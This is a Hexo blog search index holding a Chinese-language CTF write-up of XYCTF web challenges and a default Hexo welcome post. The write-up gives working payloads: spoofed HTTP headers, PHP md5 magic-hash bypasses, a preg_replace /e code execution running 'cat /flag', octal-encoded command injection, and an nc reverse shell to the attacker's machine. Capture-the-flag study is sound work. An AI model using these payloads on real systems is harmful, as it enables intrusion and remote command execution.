<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>XYCTF</title>
    <link href="/kele6.github.io/2024/04/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
    <url>/kele6.github.io/2024/04/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>源代码发现：为了防止忘记密码，我把它们放在某个地方了<br>信息泄露：robots.txt<br>发现 Disallow: &#x2F;l0g1n.txt &#x3D;&#x3D;&gt; 得到账号密码<br>不是 yuanshen.com 来的我不要 &#x3D;&#x3D;&gt;<strong>Referer: yuanshen.com</strong><br>你用的不是XYCTF的浏览器&#x3D;&#x3D;&gt; <strong>User-Agent: XYCTF</strong><br>非本地用户禁止访问！ &#x3D;&#x3D;&gt;<strong>X-Forwarded-For: 127.0.0.1    X-Real-Ip: 127.0.0.1  (这两个都行不通)</strong><br>最终： <strong>Client-Ip: 127.0.0.1</strong><br>不是从 ymzx.qq.com 代理来的我不玩&#x3D;&#x3D;&gt;<strong>Via: ymzx.qq.com</strong><br>有点饿，想吃点XYCTF的小饼干&#x3D;&#x3D;&gt;<strong>Cookies: XYCTF</strong><br>———<strong>冒号后面加空格！！！*（尤其是hackbar）</strong><br><em>OVER</em></p><h2 id="Warm-Up"><a href="#Warm-Up" class="headerlink" title="Warm Up"></a>Warm Up</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;val1&#x27;</span>]</span> != $_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;val2&#x27;</span>]</span> &amp;&amp; <span class="hljs-built_in">md5</span>($_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;val1&#x27;</span>]</span>) == <span class="hljs-built_in">md5</span>($_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;val2&#x27;</span>]</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">isset</span><span class="hljs-params">(<span class="hljs-variable">$md5</span>)</span></span> &amp;&amp; <span class="hljs-variable">$md5</span> == <span class="hljs-built_in">md5</span>(<span class="hljs-variable">$md5</span>)<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$XY</span> != <span class="hljs-string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="hljs-built_in">md5</span>(<span class="hljs-variable">$XY</span>) == <span class="hljs-built_in">md5</span>(<span class="hljs-string">&quot;XYCTF_550102591&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>payload：val1&#x3D;240610708&amp;val2&#x3D;s878926199a&amp;md5&#x3D;0e215962017&amp;XY&#x3D;QNKCDZO&amp;XYCTF&#x3D;QNKCDZO</strong><br>显示 LLeeevvveeelll222.php&#x3D;&#x3D;&gt; 打开<br><code>if (isset($_POST[&#39;a&#39;]) &amp;&amp; !preg_match(&#39;/[0-9]/&#39;, $_POST[&#39;a&#39;]) &amp;&amp; intval($_POST[&#39;a&#39;])) &#123;  echo &quot;操作你O.o&quot;;  echo preg_replace($_GET[&#39;a&#39;],$_GET[&#39;b&#39;],$_GET[&#39;c&#39;]);</code></p><p>POST_a用数组绕过+++++e模式<br><strong>payload：?a&#x3D;&#x2F;a&#x2F;e&amp;b&#x3D;system(‘cat &#x2F;flag’)&amp;c&#x3D;&#x2F;a&#x2F;e————POST: a[]&#x3D;1</strong><br><em>OVER</em></p><h2 id="easymd5-文件比较"><a href="#easymd5-文件比较" class="headerlink" title="easymd5(文件比较)"></a>easymd5(文件比较)</h2><p>将JPG文件甩在工具fastcoll上<br>生成2个文件<br><em>OVER</em></p><h2 id="说英文的复读机"><a href="#说英文的复读机" class="headerlink" title="说英文的复读机"></a>说英文的复读机</h2><p>1.抓包爆破&#x3D;&#x3D;&gt;密码：asdqwe<br>2.</p><h1 id="zzl的护理小课堂-js代码审计"><a href="#zzl的护理小课堂-js代码审计" class="headerlink" title="zzl的护理小课堂(js代码审计)"></a>zzl的护理小课堂(js代码审计)</h1><p>var flagXhr &#x3D; new XMLHttpRequest();<br>                        flagXhr.open(‘GET’, ‘flag.php’, true);<br>                        flagXhr.onreadystatechange &#x3D; function() {<br>                            if (flagXhr.readyState &#x3D;&#x3D;&#x3D; 4 &amp;&amp; flagXhr.status &#x3D;&#x3D;&#x3D; 200) {<br>                                var flag &#x3D; flagXhr.responseText;<br>                                document.getElementById(‘scoreDisplay’).innerText &#x3D; “Flag: “ + flag;<br>                            }<br>                        };<br>                        flagXhr.send(); &#x2F;&#x2F; 发送请求获取 flag</p><p>控制台：<br>var flagXhr &#x3D; new XMLHttpRequest();<br>                        flagXhr.open(‘GET’, ‘flag.php’, true);<br>                        flagXhr.onreadystatechange &#x3D; function() {<br>                            if (flagXhr.readyState &#x3D;&#x3D;&#x3D; 4 &amp;&amp; flagXhr.status &#x3D;&#x3D;&#x3D; 200) {<br>                                var flag &#x3D; flagXhr.responseText;<br>                                document.getElementById(‘scoreDisplay’).innerText &#x3D; “Flag: “ + flag;<br>                            }<br>                        };<br>                        flagXhr.send();<br><em>OVER</em></p><h2 id="牢大"><a href="#牢大" class="headerlink" title="牢大"></a>牢大</h2><p>首先是这道题的<strong>pyload:?cmd&#x3D;%0a<code>$_GET[1]</code>;%23&amp;1&#x3D;nc</strong> 你的映射的ip地址，你映射的端口 $’\57\142\151\156\57\142\141\163\150’<br>首先我们以pyload，一个一个分析<br>1.前面的get[1]不用多说就是负责绕过长度的嘛，否则也实行不了想要的命令对吧<br>2.后面为什么用nc反弹，而不能用ls，cat这些出信息，首先用的是反引号，得前面加print或者echo什么把信息打印出来（但这里echo被过滤掉了）<br>然后用print的话就无法构造$_GET，所以就nc反弹了，如果不知道什么事nc反弹那得要学一下渗透什么的，那知识点涉及还是有点多的<br>不过就是要用nc肯定没错，既然他无法回显信息，那我只要连接到我攻击机上回显不就行了吗，然后这里就要涉及到内网穿透，就是将自己的攻击机ip地址映射到公网，你可以使用</p><h2 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h2><p><img src="file:///C:\Users\17492\AppData\Roaming\Tencent\Users\1749281956\QQ\WinTemp\RichOle\1OI`Q}KDBNNW$]BOA~F941C.png" alt="img"></p><p>payload:八进制绕过</p><p><strong>?cmd&#x3D;$%27\143\141\164%27&lt;$%27\57\146\154\141\147%27</strong></p><p><a href="https://fushuling.com/index.php/2023/03/04/%E5%88%A9%E7%94%A8shell%E8%84%9A%E6%9C%AC%E5%8F%98%E9%87%8F%E6%9E%84%E9%80%A0%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4/">https://fushuling.com/index.php/2023/03/04/%E5%88%A9%E7%94%A8shell%E8%84%9A%E6%9C%AC%E5%8F%98%E9%87%8F%E6%9E%84%E9%80%A0%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4/</a><br>1.列举了白名单，数字可用，想到八进制（十六进制有字母）<br>2.不能纯八进制绕过，会被当做字符串，没有意义，要用**$’八进制’<strong>包裹<br>3.空格在linux系统里面用八进制是不可以的，</strong>可以替代空格叭<strong>，就是会转义但是不能执行（比如：会被转义成cat &#x2F;flag，但是不执行）</strong>空格不能用八进制绕过**，正好题目给了&lt;——————–如果不给&lt; 肯定会给别的，就是找替代品<br>4.于是被分成两部分，用&lt;连接</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/kele6.github.io/2024/04/14/hello-world/"/>
    <url>/kele6.github.io/2024/04/14/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
